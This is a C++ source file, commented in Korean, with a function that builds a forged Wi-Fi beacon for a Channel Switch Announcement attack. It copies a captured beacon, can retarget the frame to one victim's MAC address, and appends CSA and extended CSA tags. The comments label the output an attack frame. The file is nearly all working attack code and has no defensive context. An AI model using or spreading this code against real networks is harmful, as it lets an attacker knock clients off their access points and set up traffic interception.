#include "frame.h"
#include "dot11.h"
#include <cstring>

// 태그를 프레임 끝에 붙인다. 버퍼 초과 시 0 반환.
static size_t append_tag(
    uint8_t*       dotframe,
    size_t         dotframeSize,
    size_t         dotframeEnd,
    const uint8_t* newTag,
    size_t         newTagSize)
{
    if (dotframeEnd + newTagSize > dotframeSize) return 0;
    std::memcpy(dotframe + dotframeEnd, newTag, newTagSize);
    return dotframeEnd + newTagSize;
}

size_t build_csa_beacon(
    uint8_t*       outBuf,       // [출력] 결과(공격용 프레임) 가 담길 버퍼. 호출자가 미리 할당.
    size_t         outBufSize,   // [입력] outBuf 의 크기(바이트). 끼워 넣다가 넘으면 0 반환.
    const uint8_t* captured,     // [입력] 캡처한 원본 비콘 (RadioTap 헤더부터 시작)
    size_t         capturedLen,  // [입력] captured 의 전체 길이(바이트)
    bool           useUnicast,   // [입력] true=DA 를 staMac 으로 교체(특정 단말 표적), false=broadcast 유지
    const Mac&     staMac        // [입력] useUnicast=true 일 때 표적 단말의 MAC. false 면 무시.
){
    if (capturedLen < sizeof(Dot11RadioTap)) return 0;

    const Dot11RadioTap* rtHdr = reinterpret_cast<const Dot11RadioTap*>(captured);
    size_t rtLen = rtHdr->len();
    if (rtLen < sizeof(Dot11RadioTap) || rtLen > capturedLen) return 0;

    size_t dot11End = rtHdr->hasFCS_dataEnd(capturedLen);
    if (dot11End < rtLen + sizeof(Dot11) + sizeof(Beacon)) return 0;
    size_t dot11Len = dot11End - rtLen;

    if (outBufSize < sizeof(Dot11RadioTap) + dot11Len) return 0;

    *reinterpret_cast<Dot11RadioTap*>(outBuf) = Dot11RadioTap{};
    std::memcpy(outBuf + sizeof(Dot11RadioTap), captured + rtLen, dot11Len);

    if (useUnicast) {
        reinterpret_cast<Dot11*>(outBuf + sizeof(Dot11RadioTap))->setDst(staMac);
    }

    size_t frameEnd = sizeof(Dot11RadioTap) + dot11Len;

    Beacon::CsaTag csa;
    frameEnd = append_tag(outBuf, outBufSize, frameEnd,
                          reinterpret_cast<const uint8_t*>(&csa), sizeof(csa));
    if (frameEnd == 0) return 0;

    Beacon::EcsaTag ecsa;
    frameEnd = append_tag(outBuf, outBufSize, frameEnd,
                          reinterpret_cast<const uint8_t*>(&ecsa), sizeof(ecsa));
    if (frameEnd == 0) return 0;

    return frameEnd;
}
